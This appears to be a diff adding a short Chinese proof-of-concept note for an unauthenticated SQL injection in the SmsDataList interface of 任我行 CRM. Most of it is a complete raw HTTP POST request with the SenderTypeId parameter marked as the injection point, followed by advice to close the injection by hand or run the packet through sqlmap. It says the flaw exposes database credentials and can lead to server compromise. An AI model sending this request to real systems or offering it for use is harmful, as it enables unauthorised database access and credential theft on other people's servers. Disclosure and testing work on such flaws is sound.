@@ -1,0 +1,24 @@
+详情可参考原文 有复现截图
+原文链接：https://mp.weixin.qq.com/s/01uVhwihuwIvpAIrJT4SyQ
+
+
+任我行 CRM SmsDataList 接口处存在SQL注入漏洞，未经身份认证的攻击者可通过该漏洞获取数据库敏感信息及凭证，最终可能导致服务器失陷。
+
+
+
+POST /SMS/SmsDataList/?pageIndex=1&pageSize=30 HTTP/1.1
+Host: 
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.1361.63 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 170
+
+Keywords=&StartSendDate=2023-07-17&EndSendDate=2023-08-10&SenderTypeId=0000000000*
+
+
+
+
+SenderTypeId参数存在注入，可在SenderTypeId参数值0000000000后自行闭合注入，也可将数据包直接放入sqlmap进行验证
+
